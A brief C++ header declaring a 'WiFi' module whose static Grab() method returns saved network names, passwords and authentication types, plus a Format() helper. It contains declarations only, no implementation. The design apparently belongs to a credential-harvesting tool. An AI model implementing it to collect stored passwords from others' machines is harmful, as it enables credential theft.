 
#pragma once
#include <string>
#include <vector>
namespace Modules {
    struct WiFiRecord {
        std::string SSID;
        std::string Password;
        std::string Auth;    
    };
    class WiFi {
    public:
        static std::vector<WiFiRecord> Grab();
        static std::string Format(const std::vector<WiFiRecord>& data);
    };
}
